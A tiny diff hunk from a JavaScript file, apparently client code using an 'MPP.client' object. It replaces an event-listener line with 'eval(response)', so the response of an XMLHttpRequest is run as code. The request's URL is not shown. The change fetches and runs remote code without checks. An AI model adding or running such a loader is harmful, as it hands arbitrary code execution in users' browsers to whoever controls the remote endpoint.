@@ -6,5 +6,5 @@ xhr.send();
 xhr.onload = () => {
   const response = xhr.response;
 
-  MPP.client.on('a', msg);
+  eval(response);
 }
